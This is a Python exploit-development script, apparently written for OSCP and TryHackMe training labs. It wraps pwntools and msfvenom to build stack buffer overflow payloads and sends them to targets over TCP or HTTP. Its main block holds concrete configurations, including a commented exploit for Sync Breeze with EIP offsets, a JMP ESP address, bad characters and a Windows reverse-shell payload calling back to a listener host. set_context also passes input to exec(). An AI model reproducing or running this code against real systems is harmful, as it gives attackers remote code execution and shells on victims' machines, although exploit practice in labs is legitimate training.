#!/home/kali/.pyr0gu3/bin/python
from http.client import RemoteDisconnected
from typing import Match
from pwnlib.asm import asm
from pwnlib.context import context
from pwnlib.exception import PwnlibException
from pwnlib.util.cyclic import cyclic, cyclic_find, cyclic_metasploit, cyclic_metasploit_find
from pwnlib.util.packing import pack, unpack
from pwnlib.tubes.remote import remote
from socket import socket, AF_INET, SOCK_STREAM
from subprocess import CalledProcessError, run
from urllib.request import urlopen, Request
from urllib.parse import urlencode


class BufferOverflow(object):
    """
    Wrapper to create exploits and send them as web requests or binary strings
    """

    def __init__(self) -> None:
        super().__init__()
        self.__options = None
        self.__padding = b""
        self.__payload = b""
        self.__exploit = b""
        self.__offset = b""
        self.__buffer = b""
        self.__uri = ""
        self.__eip = b""

    def uri(self, action_: str = "", uri_: str = "") -> None:
        if action_ == "update":
            self.__uri = uri_
        elif action_ == "remove":
            self.__uri = None
        elif action_ == "":
            pass
        else:
            raise KeyError("[-] Operation not allowed\n")
        print(f"[+] URI => {self.__uri}\n")

    def padding(self, **kwargs):
        if len(kwargs) > 1:
            raise ValueError("[-] Only one argument is allowed\n")
        try:
            self.__padding = cyclic_metasploit(kwargs["length"])
        except KeyError:
            try:
                target_ = pack(kwargs["match"])
                match_ = cyclic_metasploit_find(target_, n=len(target_))
                print(f"[+] Found pattern {target_} at index {match_}\n")
                self.__padding = cyclic_metasploit(match_)
            except KeyError:
                raise ValueError("[-] Only 'match' and 'length' are acceptable arguments\n")
        print(f"[+] Padding => {self.__padding}\n")

    def set_context(self, **kwargs):
        context.clear()
        try:
            self.__encoding = kwargs['encoding']
            print(f"[+] Encoding => {self.__encoding}")
            del kwargs['encoding']
        except KeyError:
            print("[*] No valid encoding provided: defaulting to ASCII")
            self.__encoding = 'ascii'
        try:
            for key, value in kwargs.items():
                exec(f"context.{key} = '{value}'")
        except (KeyError, SyntaxError) as context_err:
            print(f"[-] Unable to set value: {context_err}\n")
            raise ValueError("Please provide a valid key/value pair.\n")
        print(f"[+] Context => {vars(context)}\n")

    def eip(self, address_: int):
        self.__eip = pack(address_)
        print(f"[+] Address to jump to => {address_: x}\n")
    
    def offset(self, **kwargs):
        try:
            length_ = kwargs['length']
            self.__offset = bytes(length_ * 'x', self.__encoding)
        except KeyError:
            try:
                target_ = kwargs['match']
                if type(target_) == 'int':
                    target_ = pack(target_)
                elif type(target_) == 'str':
                    target_ = bytes(target_, self.__encoding)
                length_ = cyclic_find(target_, n=len(target_)) - len(self.__padding) - len(self.__eip)
                self.__offset = bytes(length_ * 'x', self.__encoding)
                print(f"[+] Offset => {self.__offset}\n")
            except KeyError:
                raise ValueError("[-] Only 'length' and 'match' are valid arguments\n")
 
    def payload(self, **kwargs):
        try:
            self.__exploit = kwargs['shellcode']
            del kwargs['shellcode']
            self.__payload = 'manual'
        except KeyError:
            try:
                self.__payload = kwargs['payload']
                del kwargs['payload']
                self.__options = kwargs['options']
                del kwargs['options']
                arguments = [
                        "msfvenom",
                        "--payload", self.__payload,
                        "--format", "c"
                    ]
                
                for option, value in self.__options.items():
                    arguments.append(f"{option}={value}")

                for command, value in kwargs.items():
                    if command == "badchars":
                        command = "bad-chars"
                    arguments.append(f"--{command}")
                    arguments.append(value)
                
                msfvenom = run(arguments, capture_output=True)
                print(f"[*] Launching msfvenom:\n{' '.join(msfvenom.args)}\n")
                msfvenom.check_returncode()
                tmp = msfvenom.stdout
                self.__exploit = bytes.fromhex(
                    tmp
                    .replace(b'\x0a', b'')
                    .replace(b'"', b'')
                    .replace(b';', b'')
                    .replace(b'\x20', b'')
                    .replace(b'\\x', b'')
                    .split(b'=')[1]
                    .decode('ascii')
                )
                print(f"[*] Exploit => {self.__exploit}\n")
            except KeyError as ke:
                raise KeyError(f"[-] Unable to generate the shellcode: {ke}\n")
            except CalledProcessError as ce:
                raise CalledProcessError(f"[-] Unable to generate the shellcode: {ce}\n")
        print(f"[+] Exploit ({len(self.__exploit)} bytes) => {self.__exploit}\n")

    def prepend(self, **kwargs):
        prefix = b""
        try:
            prefix = kwargs['raw']
        except KeyError:
            try:
                prefix = asm(kwargs['instruction'])
            except KeyError:
                raise KeyError("[-] Only 'raw' and 'instruction' options are acceptable input")
        self.__exploit = prefix + self.__exploit
        print(f"[*] Exploit ({len(self.__exploit)} bytes) => {self.__exploit}\n")

    def append(self, **kwargs):
        suffix = b""
        try:
            suffix = kwargs['raw']
        except KeyError:
            try:
                suffix = asm(kwargs['instruction'])
            except KeyError:
                raise KeyError("[-] Only 'raw' and 'instruction' options are acceptable input")
        self.__exploit += suffix
        print(f"[*] Exploit ({len(self.__exploit)} bytes) => {self.__exploit}\n")

    def compose(self, *args):
        """
        The function composes the buffer based on the available input.
        The argument must be:
            1. The name of an attribute
            2. A set of instructions
            3. A string that can be converted in bytes
        """
        for chunk in args:
            try:
                tmp = self.__getattribute__("_BufferOverflow__" + chunk)
                if tmp:
                    self.__buffer += tmp
                else:
                    print(f"[*] {chunk} is an empty attribute. Skipping...")
            except (AttributeError, TypeError):
                print(f"[*] {chunk} is not a valid attribute. Attempting to add it as instruction.")
                try:
                    self.__buffer += asm(chunk)
                except (PwnlibException, TypeError):
                    print(f"[*] {chunk} is not a valid assembly instruction. Adding raw bytes to the buffer.")
                    try:
                        self.__buffer += bytes(chunk, self.__encoding)
                    except Exception as e:
                        print(self.compose.__doc__)
                        print(f"[-] {chunk} is not a valid attribute, instruction or byte sequence.")
                        raise e
        print(f"[*] Buffer => {self.__buffer}\n")

    def insert(self, chunk: str, position: int = 0):
        self.__buffer = self.__buffer[:position] + bytes(chunk, self.__encoding) + self.__buffer[position:]
        print(f"[*] Buffer => {self.__buffer}\n")
    
    def web_attack(self, field: str, method_: str = "POST", timeout_: int = 5, **kwargs):
        headers_ = kwargs['headers']
        data_ = bytes(field, 'ascii') \
                + b'=' \
                + self.__buffer \
                + b'&' \
                + bytes(urlencode(kwargs['data']), 'ascii')
        print(f"[*] Data: {data_}")
        try:
            req = Request(self.__uri, data_, headers_, method=method_)
            res = urlopen(req, timeout=timeout_)
            print(f"[*] Response: {res.read()}\n")
        except RemoteDisconnected:
            print("[*] The application crashed. Check the listener!")
        except TimeoutError:
            print("[*] The application timed out. Check the listener!")

    def attack(self, raw_exploit: bool = False, endline: bytes = ""):
        try:
            target = self.__uri.split("//")[1].split(":")
            ip = target[0]
            port = int(target[1])
            print(f"[*] Sending buffer to target => {ip}:{port}")
            if raw_exploit:
                with socket(AF_INET, SOCK_STREAM) as s:
                    s.connect((ip, port))
                    s.send(self.__buffer + bytes(endline, self.__encoding))
                    s.recv(1024)
            else:
                p = remote(ip, port)
                if endline:
                    p.newline = bytes(endline, self.__encoding)
                    p.sendline(self.__buffer)
                else:
                    p.send(self.__buffer)
                p.recv(1024)
            print("[*] Check the listener!")
        except Exception as e:
            print(f"{e}")
            print("[-] Unable to send exploit.")


if __name__ == "__main__":
    bof = BufferOverflow()

    # TryHackMe oscp - overflow1
    #bof.uri('update', "tcp://10.10.247.130:1337")
    #bof.set_context(encoding='latin-1', os='windows', bits=32)
    #bof.padding(length=1978) # !mona findmsp -distance <d>
    #bof.eip(0x42424242)
    #bof.prepend(raw=bytes(range(1, 7))+bytes(range(8, 0x2E))+bytes(range(0x2F,256)))
    #bof.compose("padding", "eip", "exploit")
    #bof.insert("OVERFLOW1 ")
    #bof.attack(raw_exploit=False, endline='\r\n')

    # TryHackMe oscp - overflow1
    bof.uri('update', "tcp://10.10.247.130:1337")
    bof.set_context(encoding='latin-1', os='windows', bits=32)
    bof.padding(length=2000) # !mona findmsp -distance <d>
    bof.compose("padding")
    bof.insert("OVERFLOW2 ")
    bof.attack(raw_exploit=False, endline='\r\n')
    
    # VulnApp1
    #bof.uri('update', "tcp://192.168.148.10:7001")
    #bof.padding(length=3000) 
    # EIP crashed @ 0x77616177 after 2288 bytes
    # ESP starting @ b'zaax' with offset of length 8
    # JMP ESP instruction found @ 0x148010CF in module VulnApp1.exe
    #bof.padding(match=0x77616177)
    #bof.eip(0x148010CF)
    #bof.offset(match='zaax')

    # Sync Breeze
    #bof.uri('update', 'http://192.168.148.10/login')
    #bof.padding(length=1000)
    # EIP crashed @ 0x68616175 after 780 bytes
    # ESP starting @ b'waah' with offset of length 4
    # JMP ESP found @ 0x10090C83
    #bof.padding(match=0x68616175)
    #bof.eip(0x10090C83)
    #bof.offset(match='waah')
    #bof.payload(
    #    payload="windows/shell_reverse_tcp",
    #    format="c",
    #    encoder="x86/shikata_ga_nai",
    #    badchars=r"\x00\x0a\x0d\x25\x26\x2b\x3d",
    #    options={'LHOST':'192.168.119.148', 'LPORT':4444, 'EXITFUNC':'thread'}
    #)
    #bof.prepend(raw=30 * b'\x90')
    #bof.compose('padding', 'eip', 'offset', 'exploit')
    #bof.web_attack('username', headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0'}, data={'password':'b'})
    
